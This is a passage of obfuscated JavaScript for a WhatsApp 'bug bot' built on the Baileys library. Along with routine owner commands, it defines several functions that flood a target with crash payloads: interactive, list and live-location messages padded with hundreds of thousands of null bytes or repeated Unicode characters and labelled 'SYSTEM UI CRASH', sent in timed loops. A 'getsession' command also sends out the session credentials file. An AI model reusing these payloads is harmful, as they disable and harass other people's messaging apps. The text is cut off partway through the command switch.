const {
  default: makeWaSocket,
  useMultiFileAuthState,
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType
} = require("@whiskeysockets/baileys");
const os = require('os');
const fs = require('fs');
const fsx = require("fs-extra");
const util = require("util");
const chalk = require('chalk');
const moment = require('moment-timezone');
const speed = require('performance-now');
const {
  exec,
  spawn,
  execSync
} = require("child_process");
const {
  performance
} = require("perf_hooks");
const more = String.fromCharCode(0x200e);
const readmore = more.repeat(0xfa1);
const {
  TelegraPh,
  UploadFileUgu,
  webp2mp4File,
  floNime
} = require("./lib/uploader");
const {
  toAudio,
  toPTT,
  toVideo,
  ffmpeg,
  addExifAvatar
} = require("./lib/converter");
const {
  smsg,
  getGroupAdmins,
  formatp,
  jam,
  formatDate,
  getTime,
  isUrl,
  await,
  sleep,
  clockString,
  msToDate,
  sort,
  toNumber,
  enumGetKey,
  runtime,
  fetchJson,
  getBuffer,
  json,
  delay,
  format,
  logic,
  generateProfilePicture,
  parseMention,
  getRandom,
  pickRandom,
  reSize
} = require('./lib/myfunc');
let afk = require("./lib/afk");
const {
  addPremiumUser,
  getPremiumExpired,
  getPremiumPosition,
  expiredCheck,
  checkPremiumUser,
  getAllPremiumUser
} = require("./lib/premiun");
const {
  fetchBuffer,
  buffergif
} = require("./lib/myfunc2");
let premium = JSON.parse(fs.readFileSync('./lib/database/premium.json'));
let _owner = JSON.parse(fs.readFileSync('./lib/database/owner.json'));
let owner = JSON.parse(fs.readFileSync('./lib/database/owner.json'));
let _afk = JSON.parse(fs.readFileSync("./lib/database/afk-user.json"));
let hit = JSON.parse(fs.readFileSync("./lib/database/total-hit-user.json"));
const VoiceNoteXeon = JSON.parse(fs.readFileSync('./lib/database/auto_reply/vn.json'));
const StickerXeon = JSON.parse(fs.readFileSync("./lib/database/auto_reply/sticker.json"));
const ImageXeon = JSON.parse(fs.readFileSync('./lib/database/auto_reply/image.json'));
const VideoXeon = JSON.parse(fs.readFileSync("./lib/database/auto_reply/video.json"));
const DocXeon = JSON.parse(fs.readFileSync("./lib/database/auto_reply/doc.json"));
const ZipXeon = JSON.parse(fs.readFileSync('./lib/database/auto_reply/zip.json'));
const ApkXeon = JSON.parse(fs.readFileSync("./lib/database/auto_reply/apk.json"));
const time2 = moment().tz("Asia/Kolkata").format("HH:mm:ss");
if (time2 < '23:59:00') {
  var xeonytimewisher = "Good Night 🌌";
}
if (time2 < "19:00:00") {
  var xeonytimewisher = "Good Evening 🌃";
}
if (time2 < '18:00:00') {
  var xeonytimewisher = "Good Evening 🌃";
}
if (time2 < '15:00:00') {
  var xeonytimewisher = "Good Afternoon 🌅";
}
if (time2 < "11:00:00") {
  var xeonytimewisher = "Good Morning 🌄";
}
if (time2 < "05:00:00") {
  var xeonytimewisher = "Good Morning 🌄";
}
module.exports = XeonBotInc = async (_0x486fbc, _0xa01f7, _0xe060f8, _0x2f1475, _0x3101b8) => {
  try {
    const {
      type: _0x25148a,
      quotedMsg: _0x4d5ce3,
      mentioned: _0x2a633d,
      now: _0x3087b6,
      fromMe: _0x2543e5
    } = _0xa01f7;
    var _0x583d9a = _0xa01f7.mtype === "conversation" ? _0xa01f7.message.conversation : _0xa01f7.mtype == "imageMessage" ? _0xa01f7.message.imageMessage.caption : _0xa01f7.mtype == 'videoMessage' ? _0xa01f7.message.videoMessage.caption : _0xa01f7.mtype == "extendedTextMessage" ? _0xa01f7.message.extendedTextMessage.text : _0xa01f7.mtype == "buttonsResponseMessage" ? _0xa01f7.message.buttonsResponseMessage.selectedButtonId : _0xa01f7.mtype == "listResponseMessage" ? _0xa01f7.message.listResponseMessage.singleSelectreplygcxeon.selectedRowId : _0xa01f7.mtype == "templateButtonreplygcxeonMessage" ? _0xa01f7.message.templateButtonreplygcxeonMessage.selectedId : _0xa01f7.mtype === "messageContextInfo" ? _0xa01f7.message.buttonsResponseMessage?.["selectedButtonId"] || _0xa01f7.message.listResponseMessage?.["singleSelectreplygcxeon"]["selectedRowId"] || _0xa01f7.text : '';
    var _0x36b760 = typeof _0xa01f7.text == "string" ? _0xa01f7.text : '';
    var _0x4ca7f9 = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(_0x583d9a) ? _0x583d9a.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0x0] : '' : prefa ?? global.prefix;
    const _0x4210ff = _0x583d9a.replace(_0x4ca7f9, '').trim().split(/ +/).shift().toLowerCase();
    const _0x1541ad = _0x583d9a.trim().split(/ +/).slice(0x1);
    const _0xa29745 = _0xa01f7.pushName || "No Name";
    const _0x8e3aaf = await _0x486fbc.decodeJid(_0x486fbc.user.id);
    const _0x5ea771 = _0xa01f7.sender;
    const _0x327751 = q = _0x1541ad.join(" ");
    const _0x1c6c8b = _0xa01f7.key.remoteJid;
    const _0x29d7be = _0xa01f7.quoted || _0xa01f7;
    const _0x166763 = _0x29d7be.mtype == 'buttonsMessage' ? _0x29d7be[Object.keys(_0x29d7be)[0x1]] : _0x29d7be.mtype == 'templateMessage' ? _0x29d7be.hydratedTemplate[Object.keys(_0x29d7be.hydratedTemplate)[0x1]] : _0x29d7be.mtype == "product" ? _0x29d7be[Object.keys(_0x29d7be)[0x0]] : _0xa01f7.quoted ? _0xa01f7.quoted : _0xa01f7;
    const _0x276cde = (_0x166763.msg || _0x166763).mimetype || '';
    const _0x5a97f9 = _0x166763.msg || _0x166763;
    const _0x19ad4a = _0x25148a == "videoMessage";
    const _0x5a24c4 = afk.checkAfkUser(_0xa01f7.sender, _afk);
    const _0x342df8 = _0xa01f7.isGroup ? await _0x486fbc.groupMetadata(_0xa01f7.chat)['catch'](_0xb1e3fb => {}) : '';
    const _0x3e3142 = _0xa01f7.isGroup ? _0x342df8.subject : '';
    const _0x216108 = _0xa01f7.isGroup ? await _0x342df8.participants : '';
    const _0x1d9644 = _0xa01f7.isGroup ? await getGroupAdmins(_0x216108) : '';
    const _0x5d7e50 = _0xa01f7.isGroup ? _0x1d9644.includes(_0x8e3aaf) : false;
    const _0x139a8b = _0xa01f7.isGroup ? _0x1d9644.includes(_0xa01f7.sender) : false;
    const _0x38568a = _0xa01f7.isGroup ? _0x342df8.owner : '';
    const _0x22d052 = _0xa01f7.isGroup ? (_0x38568a ? _0x38568a : _0x1d9644).includes(_0xa01f7.sender) : false;
    const _0x36f85a = [ownernumber, ..._owner].map(_0x54ccbb => _0x54ccbb.replace(/[^0-9]/g, '') + "@s.whatsapp.net").includes(_0xa01f7.sender);
    const _0x57f102 = _0x36f85a || _0x36f85a || checkPremiumUser(_0xa01f7.sender, premium);
    const _0x48d307 = _0x486fbc.user.id.split(':')[0x0];
    const _0x4684f0 = _0xa01f7.key.fromMe ? _0x486fbc.user.id.split(':')[0x0] + '@s.whatsapp.net' || _0x486fbc.user.id : _0xa01f7.key.participant || _0xa01f7.key.remoteJid;
    const _0x3ae961 = _0x4684f0.split('@')[0x0];
    const _0x440a12 = _0x48d307.includes(_0x3ae961);
    expiredCheck(_0x486fbc, _0xa01f7, premium);
    const _0x5264ea = _0xf94b1d => {
      _0x486fbc.sendMessage(_0xa01f7.chat, {
        'text': _0xf94b1d,
        'contextInfo': {
          'mentionedJid': [_0x5ea771],
          'forwardingScore': 0x98967f,
          'isForwarded': true,
          'externalAdReply': {
            'showAdAttribution': true,
            'containsAutoReply': true,
            'title': " " + global.botname,
            'body': '' + ownername,
            'previewType': "PHOTO",
            'thumbnailUrl': '',
            'thumbnail': fs.readFileSync("./lib/theme/thumb.jpg"),
            'sourceUrl': '' + link
          }
        }
      }, {
        'quoted': _0xa01f7
      });
    };
    const _0x50f95f = async _0x4701a6 => {
      _0x486fbc.sendMessage(_0xa01f7.chat, {
        'react': {
          'text': _0x4701a6,
          'key': _0xa01f7.key
        }
      });
    };
    async function _0x389fb9(_0x242a50, _0x3ee2ba) {
      for (let _0x55d344 = 0x0; _0x55d344 < _0x3ee2ba; _0x55d344++) {
        let _0x397d9c = generateWAMessageFromContent(_0x242a50, {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadata': {},
                'deviceListMetadataVersion': 0x2
              },
              'interactiveMessage': proto.Message.InteractiveMessage.create({
                'body': proto.Message.InteractiveMessage.Body.create({
                  'text': ''
                }),
                'footer': proto.Message.InteractiveMessage.Footer.create({
                  'text': ''
                }),
                'header': proto.Message.InteractiveMessage.Header.create({
                  'title': '',
                  'subtitle': '',
                  'hasMediaAttachment': false
                }),
                'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  'buttons': [{
                    'name': "cta_url",
                    'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
                  }],
                  'messageParamsJson': "\0".repeat(0x186a0)
                })
              })
            }
          }
        }, {});
        _0x486fbc.relayMessage(_0x242a50, _0x397d9c.message, {
          'messageId': _0x397d9c.key.id
        });
      }
    }
    async function _0x2380ed(_0x1613fb) {
      var _0x17f99c = generateWAMessageFromContent(_0x1613fb, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'title': '',
                'subtitle': " "
              },
              'body': {
                'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
              },
              'footer': {
                'text': 'xp'
              },
              'nativeFlowMessage': {
                'buttons': [{
                  'name': "cta_url",
                  'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
                }],
                'messageParamsJson': "\0".repeat(0xf4240)
              }
            }
          }
        }
      }), {
        'userJid': _0x1613fb
      });
      await _0x486fbc.relayMessage(_0x1613fb, _0x17f99c.message, {
        'participant': {
          'jid': _0x1613fb
        },
        'messageId': _0x17f99c.key.id
      });
    }
    async function _0xb9cc97(_0x1734fc) {
      var _0x486654 = generateWAMessageFromContent(_0x1734fc, proto.Message.fromObject({
        'listMessage': {
          'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(0xe09c0),
          'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
          'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
          'buttonText': null,
          'listType': 0x2,
          'productListInfo': {
            'productSections': [{
              'title': "lol",
              'products': [{
                'productId': "4392524570816732"
              }]
            }],
            'productListHeaderImage': {
              'productId': "4392524570816732",
              'jpegThumbnail': null
            },
            'businessOwnerJid': "0@s.whatsapp.net"
          }
        },
        'footer': "lol",
        'contextInfo': {
          'expiration': 0x927c0,
          'ephemeralSettingTimestamp': '1679959486',
          'entryPointConversionSource': "global_search_new_chat",
          'entryPointConversionApp': 'whatsapp',
          'entryPointConversionDelaySeconds': 0x9,
          'disappearingMode': {
            'initiator': 'INITIATED_BY_ME'
          }
        },
        'selectListType': 0x2,
        'product_header_info': {
          'product_header_info_id': 0x4433e2e130,
          'product_header_is_rejected': false
        }
      }), {
        'userJid': _0x1734fc
      });
      await _0x486fbc.relayMessage(_0x1734fc, _0x486654.message, {
        'participant': {
          'jid': _0x1734fc
        },
        'messageId': _0x486654.key.id
      });
    }
    async function _0x4c6701(_0x31d02f) {
      var _0x444ca8 = generateWAMessageFromContent(_0x31d02f, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': 'p',
              'degreesLongitude': 'p',
              'caption': "؂ن؃؄ٽ؂ن؃؄ٽ" + 'ꦾ'.repeat(0xc350),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': _0x31d02f
      });
      await _0x486fbc.relayMessage(_0x31d02f, _0x444ca8.message, {
        'participant': {
          'jid': _0x31d02f
        },
        'messageId': _0x444ca8.key.id
      });
    }
    async function _0x78070d(_0x50d3b0) {
      _0x486fbc.relayMessage(_0x50d3b0, {
        'extendedTextMessage': {
          'text': '.',
          'contextInfo': {
            'stanzaId': _0x50d3b0,
            'participant': _0x50d3b0,
            'quotedMessage': {
              'conversation': "؂ن؃؄ٽ؂ن؃؄ٽ" + 'ꦾ'.repeat(0xc350)
            },
            'disappearingMode': {
              'initiator': "CHANGED_IN_CHAT",
              'trigger': "CHAT_SETTING"
            }
          },
          'inviteLinkGroupTypeV2': "DEFAULT"
        }
      }, {
        'participant': {
          'jid': _0x50d3b0
        }
      }, {
        'messageId': null
      });
    }
    async function _0x2e190c(_0x478ea2) {
      _0x486fbc.relayMessage(_0x478ea2, {
        'paymentInviteMessage': {
          'serviceType': 'UPI',
          'expiryTimestamp': Date.now() + 0x5265c00
        }
      }, {
        'participant': {
          'jid': _0x478ea2
        }
      });
    }
    async function _0xf9e938(_0x28cf65, _0x16a8c6) {
      for (let _0x36239a = 0x0; _0x36239a < _0x16a8c6; _0x36239a++) {
        _0x2e190c(_0x28cf65);
        _0x78070d(_0x28cf65);
        await sleep(0x1f4);
      }
    }
    async function _0x5edea5(_0x1dccb9, _0x44a9c1) {
      for (let _0x4532d0 = 0x0; _0x4532d0 < _0x44a9c1; _0x4532d0++) {
        _0xb9cc97(_0x1dccb9);
        _0x4c6701(_0x1dccb9);
        _0x2380ed(_0x1dccb9);
        await sleep(0x1f4);
      }
    }
    async function _0xca15cd(_0xb440a9, _0x183559) {
      for (let _0xbe7bff = 0x0; _0xbe7bff < _0x183559; _0xbe7bff++) {
        _0x2380ed(_0xb440a9);
        _0x2380ed(_0xb440a9);
        _0x2380ed(_0xb440a9);
        await sleep(0x1f4);
      }
    }
    async function _0x960439(_0x5a321a, _0x706b41) {
      for (let _0x5b0737 = 0x0; _0x5b0737 < _0x706b41; _0x5b0737++) {
        _0x4c6701(_0x5a321a);
        _0xb9cc97(_0x5a321a);
        await sleep(0x1f4);
      }
    }
    function _0xdb78f5(_0x33f4ae, _0x404953 = [], _0x44abfc = false) {
      return _0x44abfc == null || _0x44abfc == undefined || _0x44abfc == false ? _0x486fbc.sendMessage(_0xa01f7.chat, {
        'text': _0x33f4ae,
        'mentions': _0x404953
      }, {
        'quoted': _0xa01f7
      }) : _0x486fbc.sendMessage(_0xa01f7.chat, {
        'text': _0x33f4ae,
        'mentions': _0x404953
      }, {
        'quoted': _0xa01f7
      });
    }
    const _0x11e7db = _0xd5145d => {
      _0x486fbc.sendMessage(_0x1c6c8b, {
        'text': _0xd5145d,
        'mentions': [_0x5ea771]
      }, {
        'quoted': _0xa01f7
      })["catch"](_0x259b8a => {
        return reply('Erro..');
      });
    };
    async function _0x46ee79() {
      var _0x17240a = ["《 █▒▒▒▒▒▒▒▒▒▒▒》10%", "《 ████▒▒▒▒▒▒▒▒》30%", "《 ███████▒▒▒▒▒》50%", "《 ██████████▒▒》80%", "《 ████████████》100%", "𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🕷..."];
      let {
        key: _0x2fc7b1
      } = await _0x486fbc.sendMessage(_0x1c6c8b, {
        'text': 'ʟᴏᴀᴅɪɴɢ...'
      });
      for (let _0xb60d52 = 0x0; _0xb60d52 < _0x17240a.length; _0xb60d52++) {
        await _0x486fbc.sendMessage(_0x1c6c8b, {
          'text': _0x17240a[_0xb60d52],
          'edit': _0x2fc7b1
        });
      }
    }
    if (!_0x486fbc["public"]) {
      if (!_0x36f85a && !_0xa01f7.key.fromMe) {
        return;
      }
    }
    if (autoread) {
      _0x486fbc.readMessages([_0xa01f7.key]);
    }
    if (global.autoTyping) {
      _0x486fbc.sendPresenceUpdate('composing', _0x1c6c8b);
    }
    if (global.autoRecording) {
      _0x486fbc.sendPresenceUpdate("recording", _0x1c6c8b);
    }
    _0x486fbc.sendPresenceUpdate("uavailable", _0x1c6c8b);
    if (global.autorecordtype) {
      let _0x13339d = ["recording", "composing"];
      let _0xcfa68f = _0x13339d[Math.floor(Math.random() * _0x13339d.length)];
      _0x486fbc.sendPresenceUpdate(_0xcfa68f, _0x1c6c8b);
    }
    if (autobio) {
      _0x486fbc.updateProfileStatus("DRK-ST-BUG 𝙾𝙽𝙻𝙸𝙽𝙴 𝙱𝚈 " + ownername)['catch'](_0x3cfe2c => _0x3cfe2c);
    }
    if (_0xa01f7.sender.startsWith('92') && global.anti92 === true) {
      return _0x486fbc.updateBlockStatus(_0xa01f7.sender, "block");
    }
    let _0x1ec162 = [];
    for (let _0xc4c01e of owner) {
      _0x1ec162.push({
        'displayName': await _0x486fbc.getName(_0xc4c01e),
        'vcard': "BEGIN:VCARD\nVERSION:3.0\nN:" + (await _0x486fbc.getName(_0xc4c01e)) + "\nFN:" + (await _0x486fbc.getName(_0xc4c01e)) + "\nitem1.TEL;waid=" + _0xc4c01e + ':' + _0xc4c01e + "\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:" + ytname + "\nitem2.X-ABLabel:YouTube\nitem3.URL:" + socialm + "\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;" + location + ";;;;\nitem4.X-ABLabel:Region\nEND:VCARD"
      });
    }
    if (_0xa01f7.message && _0xa01f7.isGroup) {
      console.log(chalk.cyan("\n< ================================================== >\n"));
      console.log(chalk.green("Group Chat:"));
      console.log(chalk.black(chalk.bgWhite("[ MESSAGE ]")), chalk.black(chalk.bgGreen(new Date())), chalk.black(chalk.bgBlue(_0x36b760 || _0xa01f7.mtype)) + "\n" + chalk.magenta("=> From"), chalk.green(_0xa29745), chalk.yellow(_0xa01f7.sender) + "\n" + chalk.blueBright("=> In"), chalk.green(_0x3e3142, _0xa01f7.chat));
    } else {
      console.log(chalk.cyan("\n< ================================================== >\n"));
      console.log(chalk.green("Private Chat:"));
      console.log(chalk.black(chalk.bgWhite("[ MESSAGE ]")), chalk.black(chalk.bgGreen(new Date())), chalk.black(chalk.bgBlue(_0x36b760 || _0xa01f7.mtype)) + "\n" + chalk.magenta("=> From"), chalk.green(_0xa29745), chalk.yellow(_0xa01f7.sender));
    }
    if (_0x4210ff) {
      const _0x4c1b1b = () => {
        hit[0x0].hit_cmd += 0x1;
        fs.writeFileSync('./lib/database/total-hit-user.json', JSON.stringify(hit));
      };
      _0x4c1b1b();
    }
    for (let _0x2eb443 of VoiceNoteXeon) {
      if (_0x36b760 === _0x2eb443) {
        let _0x33b604 = fs.readFileSync('./lib/Media/audio/' + _0x2eb443 + ".mp3");
        _0x486fbc.sendMessage(_0xa01f7.chat, {
          'audio': _0x33b604,
          'mimetype': "audio/mp4",
          'ptt': true
        }, {
          'quoted': _0xa01f7
        });
      }
    }
    for (let _0x147e66 of StickerXeon) {
      if (_0x36b760 === _0x147e66) {
        let _0x1aa00e = fs.readFileSync("./lib/Media/sticker/" + _0x147e66 + ".webp");
        _0x486fbc.sendMessage(_0xa01f7.chat, {
          'sticker': _0x1aa00e
        }, {
          'quoted': _0xa01f7
        });
      }
    }
    for (let _0x16b778 of ImageXeon) {
      if (_0x36b760 === _0x16b778) {
        let _0x44d87a = fs.readFileSync("./lib/Media/image/" + _0x16b778 + ".jpg");
        _0x486fbc.sendMessage(_0xa01f7.chat, {
          'image': _0x44d87a
        }, {
          'quoted': _0xa01f7
        });
      }
    }
    for (let _0x42c71c of VideoXeon) {
      if (_0x36b760 === _0x42c71c) {
        let _0x4c221a = fs.readFileSync('./lib/Media/video/' + _0x42c71c + ".mp4");
        _0x486fbc.sendMessage(_0xa01f7.chat, {
          'video': _0x4c221a
        }, {
          'quoted': _0xa01f7
        });
      }
    }
    const _0x792c = _0x48247c => {
      _0x486fbc.sendMessage(_0x1c6c8b, {
        'document': _0x48247c,
        'mimetype': "application/vnd.android.package-archive"
      }, {
        'quoted': _0xa01f7
      });
    };
    for (let _0x1596aa of ApkXeon) {
      if (_0x36b760 === _0x1596aa) {
        let _0x3c2039 = fs.readFileSync("./lib/Media/apk/" + _0x1596aa + ".apk");
        _0x792c(_0x3c2039);
      }
    }
    const _0x2f4e71 = _0x5484b5 => {
      _0x486fbc.sendMessage(_0x1c6c8b, {
        'document': _0x5484b5,
        'mimetype': "application/zip"
      }, {
        'quoted': _0xa01f7
      });
    };
    for (let _0x1ebae3 of ZipXeon) {
      if (_0x36b760 === _0x1ebae3) {
        let _0x2d8035 = fs.readFileSync('./lib/Media/zip/' + _0x1ebae3 + ".zip");
        _0x2f4e71(_0x2d8035);
      }
    }
    const _0x1edf55 = _0x8da020 => {
      haikal.sendMessage(_0x1c6c8b, {
        'document': _0x8da020,
        'mimetype': "application/pdf"
      }, {
        'quoted': _0xa01f7
      });
    };
    for (let _0x12ef45 of DocXeon) {
      if (_0x36b760 === _0x12ef45) {
        let _0x300969 = fs.readFileSync("./lib/Media/doc/" + _0x12ef45 + ".pdf");
        _0x1edf55(_0x300969);
      }
    }
    if (_0xa01f7.isGroup && !_0xa01f7.key.fromMe) {
      let _0x36b05e = [...new Set([...(_0xa01f7.mentionedJid || []), ...(_0xa01f7.quoted ? [_0xa01f7.quoted.sender] : [])])];
      for (let _0x3a7045 of _0x36b05e) {
        if (afk.checkAfkUser(_0x3a7045, _afk)) {
          let _0x1afc9e = afk.getAfkId(_0x3a7045, _afk);
          let _0x294de1 = afk.getAfkReason(_0x1afc9e, _afk);
          _0x5264ea("Don't tag him, he's afk\n\n*Reason :* " + _0x294de1);
        }
      }
      if (afk.checkAfkUser(_0xa01f7.sender, _afk)) {
        _afk.splice(afk.getAfkPosition(_0xa01f7.sender, _afk), 0x1);
        fs.writeFileSync("./lib/database/afk-user.json", JSON.stringify(_afk));
        _0x486fbc.sendTextWithMentions(_0xa01f7.chat, '@' + _0xa01f7.sender.split('@')[0x0] + " have returned from afk", _0xa01f7);
      }
    }
    switch (_0x4210ff) {
      case 'addprem':
        if (!_0x36f85a) {
          return _0x5264ea(mess.owner);
        }
        if (_0x1541ad.length < 0x2) {
          return _0x5264ea("Use :\n*#addprem* @tag time\n*#addprem* number time\n\nExample : #addprem @tag 30d");
        }
        if (_0xa01f7.mentionedJid.length !== 0x0) {
          for (let _0x51c572 = 0x0; _0x51c572 < _0xa01f7.mentionedJid.length; _0x51c572++) {
            addPremiumUser(_0xa01f7.mentionedJid[0x0], _0x1541ad[0x1], premium);
          }
          _0x5264ea("Premium Success");
        } else {
          addPremiumUser(_0x1541ad[0x0] + '@s.whatsapp.net', _0x1541ad[0x1], premium);
          _0x5264ea("Success");
        }
        break;
      case "delprem":
        if (!_0x36f85a) {
          return _0x5264ea(mess.owner);
        }
        if (_0x1541ad.length < 0x1) {
          return _0x5264ea("Use :\n*#delprem* @tag\n*#delprem* number");
        }
        if (_0xa01f7.mentionedJid.length !== 0x0) {
          for (let _0x922e97 = 0x0; _0x922e97 < _0xa01f7.mentionedJid.length; _0x922e97++) {
            premium.splice(getPremiumPosition(_0xa01f7.mentionedJid[_0x922e97], premium), 0x1);
            fs.writeFileSync('./lib/database/premium.json', JSON.stringify(premium));
          }
          _0x5264ea("Delete success");
        } else {
          premium.splice(getPremiumPosition(_0x1541ad[0x0] + '@s.whatsapp.net', premium), 0x1);
          fs.writeFileSync("./lib/database/premium.json", JSON.stringify(premium));
          _0x5264ea("Success");
        }
        break;
      case 'listprem':
        {
          if (!_0x36f85a) {
            return _0x5264ea(mess.owner);
          }
          let _0x232b1a = require('./lib/database/premium.json');
          let _0x4469af = "*------「 LIST PREMIUM 」------*\n\n";
          for (let _0xc56e0a of _0x232b1a) {
            _0x4469af += "Number : " + _0xc56e0a.id + "\n";
            _0x4469af += "Expired : " + _0xc56e0a.expired + " Second\n";
          }
          _0x486fbc.sendMessage(_0xa01f7.chat, {
            'text': _0x4469af,
            'mentions': i
          }, {
            'quoted': _0xa01f7
          });
        }
        break;
      case 'deletesession':
      case "delsession":
      case 'clearsession':
        {
          if (!_0x36f85a) {
            return _0x5264ea(mess.owner);
          }
          fs.readdir("./session", async function (_0xaff432, _0xdf2876) {
            if (_0xaff432) {
              console.log("Unable to scan directory: " + _0xaff432);
              return _0x5264ea("Unable to scan directory: " + _0xaff432);
            }
            let _0x287cf0 = await _0xdf2876.filter(_0x4cc1ad => _0x4cc1ad.startsWith("pre-key") || _0x4cc1ad.startsWith("sender-key") || _0x4cc1ad.startsWith("session-") || _0x4cc1ad.startsWith("app-state"));
            console.log(_0x287cf0.length);
            let _0x5d59c7 = "Detected " + _0x287cf0.length + " junk files\n\n";
            if (_0x287cf0.length == 0x0) {
              return _0x5264ea(_0x5d59c7);
            }
            _0x287cf0.map(function (_0x249daf, _0x10b5af) {
              _0x5d59c7 += _0x10b5af + 0x1 + (". " + _0x249daf + "\n");
            });
            _0x5264ea(_0x5d59c7);
            await sleep(0x7d0);
            _0x5264ea("Delete junk files...");
            await _0x287cf0.forEach(function (_0x1abc8f) {
              fs.unlinkSync("./session/" + _0x1abc8f);
            });
            await sleep(0x7d0);
            _0x5264ea("Successfully deleted all the trash in the session folder");
          });
        }
        break;
      case 'join':
        try {
          if (!_0x36f85a) {
            return _0x5264ea(mess.owner);
          }
          if (!_0x327751) {
            return _0x5264ea("Enter Group Link!");
          }
          if (!isUrl(_0x1541ad[0x0]) && !_0x1541ad[0x0].includes('whatsapp.com')) {
            return _0x5264ea("Link Invalid!");
          }
          _0x5264ea(mess.wait);
          let _0x2d23cf = _0x1541ad[0x0].split('https://chat.whatsapp.com/')[0x1];
          await _0x486fbc.groupAcceptInvite(_0x2d23cf).then(_0x2604d3 => _0x5264ea(json(_0x2604d3)))["catch"](_0x3505fe => _0x5264ea(json(_0x3505fe)));
        } catch {
          _0x5264ea("Failed to join the Group");
        }
        break;
      case "getsession":
        if (!_0x36f85a) {
          return _0x5264ea(mess.owner);
        }
        _0x5264ea("Wait a moment, currently retrieving your session file");
        let _0x2f2e4e = await fs.readFileSync("./session/creds.json");
        _0x486fbc.sendMessage(_0xa01f7.chat, {
          'document': _0x2f2e4e,
          'mimetype': 'application/json',
          'fileName': "creds.json"
        }, {
          'quoted': _0xa01f7
        });
        break;
      case "shutdown":
        if (!_0x36f85a) {
          return _0x5264ea(mess.owner);
        }
        _0x5264ea("Goodbye🖐");
        await sleep(0xbb8);
        process.exit();
        break;
      case "restart":
        if (!_0x36f85a) {
          return _0x5264ea(mess.owner);
        }
        _0x5264ea("In Process....");
        exec("pm2 restart all");
        break;
      case "autoread":
        if (!_0x36f85a) {
          return _0x5264ea(mess.owner);
        }
        if (_0x1541ad.length < 0x1) {
          return _0x5264ea("Example " + (_0x4ca7f9 + _0x4210ff) + " on/off");
        }
        if (q === 'on') {
          autoread = true;
          _0x5264ea("Successfully changed autoread to " + q);
        } else if (q === "off") {
          autoread = false;
          _0x5264ea("Successfully changed autoread to " + q);
        }
        break;
      case 'autotyping':
        if (!_0x36f85a) {
          return _0x5264ea(mess.owner);
        }
        if (_0x1541ad.length < 0x1) {
          return _0x5264ea("Example " + (_0x4ca7f9 + _0x4210ff) + " on/off");
        }
        if (q === 'on') {
          autoTyping = true;
          _0x5264ea("Successfully changed auto-typing to " + q);
        } else if (q === "off") {
          autoTyping = false;
          _0x5264ea("Successfully changed auto-typing to " + q);
        }
        break;
      case "autorecording":
        if (!_0x36f85a) {
          return _0x5264ea(mess.owner);
        }
        if (_0x1541ad.length < 0x1) {
          return _0x5264ea("Example " + (_0x4ca7f9 + _0x4210ff) + " on/off");
        }
        if (q === 'on') {
          autoRecording = true;
          _0x5264ea("Successfully changed auto-recording to " + q);
        } else if (q === "off") {
          autoRecording = false;
          _0x5264ea("Successfully changed auto-recording to " + q);
        }
        break;
      case "autorecordtyp":
        if (!_0x36f85a) {
          return _0x5264ea(mess.owner);
        }
        if (_0x1541ad.length < 0x1) {
          return _0x5264ea("Example " + (_0x4ca7f9 + _0x4210ff) + " on/off");
        }
        if (q === 'on') {
          autorecordtype = true;
          _0x5264ea("Successfully changed auto recording and typing to " + q);
        } else if (q === "off") {
          autorecordtype = false;
          _0x5264ea("Successfully changed auto recording and typing to " + q);
        }
        break;
      case 'autoswview':
      case 'autostatusview':
        {
          if (!_0x36f85a) {
            return _0x5264ea(mess.owner);
          }
          if (_0x1541ad.length < 0x1) {
            return _0x5264ea("on/off?");
          }
          if (_0x1541ad[0x0] === 'on') {
            autoswview = true;
            _0x5264ea(_0x4210ff + " is enabled");
          } else if (_0x1541ad[0x0] === "off") {
            autoswview = false;
            _0x5264ea(_0x4210ff + " is disabled");
          }
        }
        break;
      case 'autobio':
        if (!_0x36f85a) {
          return _0x5264ea(mess.owner);
        }
        if (_0x1541ad.length < 0x1) {
          return _0x5264ea("Example " + (_0x4ca7f9 + _0x4210ff) + " on/off");
        }
        if (q == 'on') {
          autobio = true;
          _0x5264ea("Successfully Changed AutoBio To " + q);
        } else if (q == "off") {
          autobio = false;
          _0x5264ea("Successfully Changed AutoBio To " + q);
        }
        break;
      case "mode":
        if (!_0x36f85a) {
          return _0x5264ea(mess.owner);
        }
        if (_0x1541ad.length < 0x1) {
          return _0x5264ea("Example " + (_0x4ca7f9 + _0x4210ff) + " public/self");
        }
        if (q == "public") {
          _0x486fbc["public"] = true;
          _0x5264ea(mess.done);
        } else if (q == "self") {
          _0x486fbc['public'] = false;
          _0x5264ea(mess.done);
        }
        break;
      case "setexif":
        if (!_0x36f85a) {
          return _0x5264ea(mess.owner);
        }
        if (!_0x327751) {
          return _0x5264ea("Example : " + (_0x4ca7f9 + _0x4210ff) + " packname|author");
        }
